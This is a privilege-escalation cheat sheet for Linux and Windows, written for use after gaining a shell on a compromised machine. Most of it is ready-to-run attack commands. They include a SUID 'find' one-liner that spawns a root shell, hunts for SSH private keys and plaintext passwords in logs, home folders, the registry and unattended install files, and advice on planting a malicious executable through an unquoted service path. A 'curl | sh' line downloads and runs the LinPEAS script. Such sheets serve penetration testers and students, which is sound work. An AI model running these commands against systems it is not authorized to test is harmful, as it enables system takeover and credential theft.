# Privilege Escalation Cheat Sheet

A comprehensive guide of essential command snippets and enumeration scripts used to elevate privileges from a low-level user to Root (Linux) or System (Windows).

---

## Linux Privilege Escalation

After obtaining a shell on a Linux system, use these commands to find privilege escalation paths.

### 1. Quick Enumeration Commands

*   **Operating System & Kernel Version:**
    ```bash
    uname -a
    cat /etc/issue
    cat /etc/*-release
    ```
    *Look for old kernel versions vulnerable to exploits like Dirty COW.*
*   **Current User & Permissions:**
    ```bash
    whoami
    id
    groups
    ```
*   **List Sudo Privileges:**
    ```bash
    sudo -l
    ```
    *Check if the current user can run any command as root without a password.*
*   **Show Running Processes (Root processes):**
    ```bash
    ps aux | grep root
    ```

### 2. SUID (Set Owner User ID) Binaries

SUID binaries run with the privileges of the file owner (often root).

*   **Find all SUID files:**
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    find / -uid 0 -perm -4000 -type f 2>/dev/null
    ```
*   **GTFOBins Exploitation:**
    *Compare discovered SUID files against [GTFOBins](https://gtfobins.github.io/) to see if they can be abused to spawn a root shell.*
    *Example SUID exploit (e.g., if `/usr/bin/find` has SUID bit set):*
    ```bash
    find . -exec /bin/sh -p \; -quit
    ```

### 3. Writable Files & Directories

Find configuration files or keys containing plain text credentials.

*   **Find writable files in `/etc`:**
    ```bash
    find /etc -writable -type f 2>/dev/null
    ```
    *Check if `/etc/passwd` or `/etc/shadow` are writable.*
*   **Find readable SSH keys:**
    ```bash
    find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
    ```
*   **Find plain text passwords in files:**
    ```bash
    grep --color=auto -rnw '/var/log' -e "password" -e "pass" 2>/dev/null
    grep --color=auto -rnw '/home' -e "password" 2>/dev/null
    ```

### 4. Cron Jobs

*   **View scheduled system jobs:**
    ```bash
    cat /etc/crontab
    ls -la /etc/cron.*
    ```
    *Look for cron jobs executing scripts that you can write to.*

---

## Windows Privilege Escalation

Enumeration commands to find escalation paths on compromised Windows machines.

### 1. System Information

*   **Operating System & Hotfixes:**
    ```cmd
    systeminfo
    ```
    *Check OS version, architecture, and installed KBs (look for missing security patches).*
*   **Current User & Privileges:**
    ```cmd
    whoami
    whoami /priv
    whoami /groups
    ```
    *Look for enabling privileges like `SeBackupPrivilege`, `SeImpersonatePrivilege` (Juicy Potato/PrintSpoofer).*

### 2. Unquoted Service Paths

When a service path contains spaces and is not enclosed in quotes, Windows attempts to execute files in sequence.

*   **Find services with unquoted paths:**
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
    ```
    *Example:* If path is `C:\Program Files\My App\service.exe`, compile a malicious payload, rename it `program.exe`, and upload it to `C:\`.

### 3. Service Permissions

Check if your low-privilege user can modify service configurations.

*   **Check permissions of services using Accesschk (Sysinternals):**
    ```cmd
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -qdws "Authenticated Users" C:\
    ```
*   **Check permissions of service using PowerShell:**
    ```powershell
    Get-Service | Get-Acl | Select-Object Path, AccessToString | Format-List
    ```

### 4. Plain Text Passwords & Registry Keys

Windows sometimes stores passwords in unattended installation files or registry hives.

*   **Search for registry auto-logon passwords:**
    ```cmd
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
    ```
*   **Search for passwords in the registry:**
    ```cmd
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    ```
*   **Find unattended XML installer files:**
    ```cmd
    dir /s *unattend*.xml *sysprep*.inf *sysprep*.xml 2>nul
    ```

---

## Automated Enumeration Tools

Rather than typing commands manually, download and execute these automated scripts.

*   **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)** (Linux Privilege Escalation Awesome Script)
    ```bash
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    ```
*   **[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)** (Windows Privilege Escalation Awesome Script)
    ```cmd
    winpeas.exe
    ```
*   **[Sherlock](https://github.com/rasta-mouse/Sherlock)** (PowerShell script to find missing software patches)
    ```powershell
    Import-Module .\Sherlock.ps1
    Find-AllVulns
    ```
